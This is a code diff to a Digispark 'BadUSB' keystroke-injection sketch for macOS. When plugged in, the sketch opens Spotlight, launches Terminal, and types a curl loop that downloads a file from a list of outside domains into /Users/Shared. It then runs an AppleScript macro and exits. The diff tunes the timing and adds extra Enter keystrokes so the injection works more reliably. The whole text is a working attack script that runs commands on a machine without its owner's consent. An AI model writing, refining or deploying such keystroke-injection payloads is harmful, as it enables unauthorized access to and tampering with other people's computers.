@@ -40,15 +40,21 @@ void loop() {
   }
 
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1500);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.print("terminal");
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(1250);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000);
+  DigiKeyboard.delay(3500);
 
 
   DigiKeyboard.print(F("for i in " DOMAINS "; do curl https://$i" LINK " --output /Users/Shared/oreo.jpg && break; done;\n" OSASCRIPT "exit\n"));
-    DigiKeyboard.delay(3500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(4500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(0500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(0500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(0500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(0500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(0500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(0500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(50);
 
